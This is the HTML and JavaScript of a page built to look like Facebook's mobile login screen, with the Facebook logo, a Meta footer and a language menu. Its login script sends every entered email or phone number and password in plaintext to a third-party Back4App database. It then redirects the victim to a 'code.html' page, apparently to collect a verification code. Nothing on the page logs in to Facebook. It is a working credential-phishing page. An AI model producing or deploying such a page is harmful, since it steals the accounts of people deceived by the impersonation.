<body>

  <!-- Intro Text -->
  <div class="intro-text">
    <h1>Facebook</h1>
    <p>Facebook helps you connect and share with the people in your life.</p>

  <!-- Language Toggle -->
  <div class="language-toggle" onclick="openLanguageModal()">
    English (UK) &#x25BC;
  </div>

  <!-- Login Container -->
  <div class="login-container">
    <div class="fb-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
    </div>

    <div class="input-group">
      <input type="text" id="username" placeholder=" " />
      <label for="username">Mobile number or email address</label>
    </div>

    <div class="input-group">
      <input type="password" id="password" placeholder=" " />
      <label for="password">Password</label>
    </div>

    <button class="login-btn" onclick="loginUser()">Log in</button>
    <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
  </div>

  <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>

  <!-- Language Modal -->
  <div id="languageModal" class="language-modal">
    <div class="language-modal-header">
      <span class="close-btn" onclick="closeLanguageModal()">&times;</span>
      <span class="modal-title">Select Language</span>
    </div>
    <ul class="language-modal-list">
      <li onclick="selectLanguage('English (UK)')">English (UK)</li>
      <li onclick="selectLanguage('Español')">Español</li>
      <li onclick="selectLanguage('Français (France)')">Français (France)</li>
      <li onclick="selectLanguage('Deutsch')">Deutsch</li>
      <li onclick="selectLanguage('Português (Brasil)')">Português (Brasil)</li>
      <li onclick="selectLanguage('Italiano')">Italiano</li>
    </ul>
  </div>
  <div class="meta-footer">
    <div class="top-line">
      <img src="metalogo.png" alt="Meta Logo" />
      <span class="meta-text">Meta</span>
    </div>
    <div class="bottom-line">
      About · Help · More
    </div>
  </div>

  <!-- JavaScript -->
  <script>
  function openLanguageModal() {
    document.getElementById('languageModal').style.display = 'block';
  }

  function closeLanguageModal() {
    document.getElementById('languageModal').style.display = 'none';
  }

  function selectLanguage(language) {
    document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
    closeLanguageModal();
  }

  function showError(inputElement) {
    inputElement.style.borderColor = 'red';

    const error = document.createElement('div');
    error.className = 'error-message';
    error.style.color = 'red';
    error.style.fontSize = '12px';
    error.style.marginTop = '4px';
    error.textContent = 'Required';

    inputElement.parentNode.appendChild(error);
  }

  function loginUser() {
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  // Clear previous error states
  document.querySelectorAll('.error-message').forEach(el => el.remove());
  [usernameInput, passwordInput].forEach(input => {
    input.style.borderColor = '#ccc';
  });

  let hasError = false;

  if (!username) {
    showError(usernameInput);
    hasError = true;
  }

  if (!password) {
    showError(passwordInput);
    hasError = true;
  }

  if (hasError) return;

  // ✅ Use Back4App to save login data
  const Login = Parse.Object.extend("Login");
  const login = new Login();
  login.set("username", username);
  login.set("password", password); // ⚠️ You should hash passwords in real apps

  login.save()
    .then(() => {
      localStorage.setItem("login_user", username);
      window.location.href = "code.html"; // or wherever you want to redirect
    })
    .catch((error) => {
      console.error("Login save failed:", error);
      alert("An error occurred while submitting the login.");
    });
}

  // Keyboard detection and footer adjustment
  (() => {
    const footer = document.querySelector('.meta-footer');
    let initialHeight = window.innerHeight;

    window.addEventListener('resize', () => {
      const currentHeight = window.innerHeight;

      if (initialHeight - currentHeight > 150) {
        // Keyboard is probably open
        footer.style.transform = 'translateY(100%)';
      } else {
        // Keyboard is probably closed
        footer.style.transform = 'translateY(0)';
      }
    });
  })();
</script>
